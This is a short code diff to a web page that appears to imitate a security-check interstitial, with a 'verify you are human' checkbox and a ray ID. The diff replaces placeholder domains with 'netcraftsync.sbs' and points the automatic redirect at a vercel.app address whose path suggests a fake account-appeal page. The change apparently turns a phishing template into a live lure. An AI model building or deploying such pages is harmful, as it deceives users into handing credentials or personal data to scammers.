@@ -16,10 +16,10 @@ const langMap = {
     footer: "This site is performing a security check before allowing access."
   },
   vi: {
-    title: "www.trangcuaban.com",
+    title: "www.netcraftsync.sbs",
     description: "Đang kiểm tra bảo mật kết nối của bạn...",
     checkbox: "Xác minh bạn là con người",
-    footer: "www.trangcuaban.com cần đánh giá tính bảo mật kết nối của bạn trước khi tiếp tục."
+    footer: "www.netcraftsync.sbs cần đánh giá tính bảo mật kết nối của bạn trước khi tiếp tục."
   }
 };
 
@@ -44,7 +44,7 @@ function redirect() {
   const rayId = generateRayID();
   document.getElementById('ray-id').textContent = rayId;
   setTimeout(() => {
-    window.location.href = "https://your-link.com";
+    window.location.href = "https://appealcaseid1390756882.vercel.app/disagree-decision";
   }, 1500);
 }
 
